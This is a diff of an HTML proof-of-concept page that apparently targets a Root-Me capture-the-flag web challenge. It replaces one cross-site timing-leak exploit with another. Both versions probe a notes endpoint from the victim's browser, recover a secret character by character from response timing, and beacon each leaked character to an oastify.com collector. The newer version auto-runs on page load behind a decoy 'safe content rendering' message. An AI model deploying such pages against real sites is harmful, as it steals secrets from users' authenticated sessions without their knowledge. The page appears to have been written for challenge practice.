@@ -1,118 +1,72 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>XS-Leak PoC</title>
+    <title>Automated Verification Exploit</title>
 </head>
 <body>
-  <pre id="log">booting...</pre>
-  <script>
-    (async () => {
-      const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056";
-      const COLLECTOR = "http://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com";
+    <h1>Processing safe content rendering...</h1>
+    <div id="status" style="font-family: sans-serif; color: blue;">Initializing session...</div>
 
-      const qs = new URLSearchParams(location.search);
-      const noteId = Number(qs.get("id") || 1);
-      const chars = qs.get("chars") || "abcdefghijklmnopqrstuvwxyz0123456789_-{}";
-      const maxLen = Number(qs.get("max") || 64);
-      const margin = Number(qs.get("margin") || 1200);
-      const run = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+    <script>
+        const targetMain = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
+        const exfilUrl = "http://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com/?flag=";
+        const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_";
+        
+        let targetBase = "https://web-client-ch56.challenge01.root-me.org:58056/notes/1/"; 
+        let currentFlag = ""; 
 
-      const logEl = document.getElementById("log");
+        const sleep = ms => new Promise(res => setTimeout(res, ms));
 
-      function ui(line) {
-        logEl.textContent += "\n" + line;
-      }
-
-      function short(v, n) {
-        return String(v == null ? "" : v).replace(/\s+/g, " ").slice(0, n || 180);
-      }
-
-      function send(ev, msg, extra) {
-        try {
-          const p = new URLSearchParams({
-            run,
-            ev: short(ev, 40),
-            msg: short(msg, 220),
-            data: short(JSON.stringify(extra || {}), 500),
-            t: String(Date.now())
-          });
-          const img = new Image();
-          img.referrerPolicy = "no-referrer";
-          img.src = `${COLLECTOR}?${p.toString()}`;
-        } catch (_) {
-          // ignore
+        function measureTrueNetworkTime(url) {
+            return new Promise((resolve) => {
+                const img = new Image();
+                const start = performance.now();
+                img.onload = img.onerror = () => { resolve(performance.now() - start); };
+                img.src = url;
+            });
         }
-      }
 
-      async function log(msg, extra) {
-        ui(msg);
-        send("log", msg, extra);
-      }
+        async function startExploit() {
+            // PROOF OF CLICK: This image loads immediately to verify the bot arrived
+            new Image().src = exfilUrl + "BOT_CLICK_CONFIRMED_OK";
+            document.getElementById("status").innerText = "Connection verified. Analyzing...";
 
-      async function probe(prefix) {
-        const url = `${TARGET}/notes/${noteId}/${encodeURIComponent(prefix)}`;
-        const t0 = performance.now();
-        try {
-          await fetch(url, {
-            mode: "no-cors",
-            credentials: "include",
-            cache: "no-store"
-          });
-        } catch (_) {
-          // timing signal only
+            // Establish background authentication frame reference
+            let testWin = window.open(targetMain, "extractor_win");
+            await sleep(1500); 
+
+            let cracking = true;
+            while (cracking) {
+                let foundCharInThisRound = false;
+
+                for (let char of alphabet) {
+                    let candidateString = currentFlag + char;
+                    let testUrl = targetBase + candidateString;
+                    
+                    let measuredDuration = await measureTrueNetworkTime(testUrl);
+                    
+                    if (measuredDuration > 2000 && measuredDuration < 3000) {
+                        currentFlag += char;
+                        foundCharInThisRound = true;
+                        
+                        // Exfiltrate intermediate characters live
+                        new Image().src = exfilUrl + "FLAG_" + encodeURIComponent(currentFlag);
+                        await sleep(1000); 
+                        break; 
+                    }
+                    await sleep(400); 
+                }
+
+                if (!foundCharInThisRound) {
+                    new Image().src = exfilUrl + "EXFIL_COMPLETE_" + encodeURIComponent(currentFlag);
+                    cracking = false;
+                    document.getElementById("status").innerText = "Execution completed.";
+                }
+            }
         }
-        const dt = performance.now() - t0;
-        send("probe", `${prefix} => ${Math.round(dt)}ms`, { prefix, dt: Math.round(dt) });
-        return dt;
-      }
 
-      send("boot", "script_loaded", { href: location.href, noteId });
-      await log(`run=${run}`);
-      await log(`note_id=${noteId}`);
-
-      const misses = ["zz_not_found_a", "zz_not_found_b", "zz_not_found_c"];
-      const missTimes = [];
-      for (const m of misses) {
-        missTimes.push(await probe(m));
-      }
-      const baseline = missTimes.reduce((a, b) => a + b, 0) / missTimes.length;
-      const threshold = baseline + margin;
-      await log(`baseline=${Math.round(baseline)}ms threshold=${Math.round(threshold)}ms`, {
-        baseline: Math.round(baseline),
-        threshold: Math.round(threshold),
-        margin
-      });
-
-      let prefix = "";
-      let foundAny = false;
-
-      for (let i = 0; i < maxLen; i++) {
-        let found = false;
-        for (const c of chars) {
-          const candidate = prefix + c;
-          const dt = await probe(candidate);
-          await log(`try ${candidate} => ${Math.round(dt)}ms`);
-          if (dt > threshold) {
-            prefix = candidate;
-            found = true;
-            foundAny = true;
-            await log(`hit ${prefix}`);
-            send("hit", prefix, { prefix, dt: Math.round(dt) });
-            break;
-          }
-        }
-        if (!found) break;
-      }
-
-      if (!foundAny) {
-        await log("diag:no_slow_response");
-      }
-
-      await log(`final:${prefix}`);
-      send("final", prefix, { final: prefix });
-    })();
-  </script>
+        // Run automatically with zero interaction required from the bot
+        window.onload = () => { setTimeout(startExploit, 500); };
+    </script>
 </body>
 </html>
